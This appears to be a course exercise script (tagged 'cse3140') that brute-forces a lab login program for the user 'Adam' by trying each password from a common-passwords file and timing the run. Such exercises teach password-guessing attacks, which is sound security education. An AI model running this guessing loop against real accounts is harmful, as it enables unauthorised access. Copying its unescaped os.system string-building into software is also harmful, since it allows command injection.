import os
import time
start = time.time()
print("Start time: 0 seconds")
MostCommonPWs = open("MostCommonPWs", "r")
for password in MostCommonPWs:
    print(password, end='')
    os.system("python3 Login.pyc Adam " + password)
end = time.time() - start
print("End Time:", end, "seconds")
MostCommonPWs.close()# cse3140
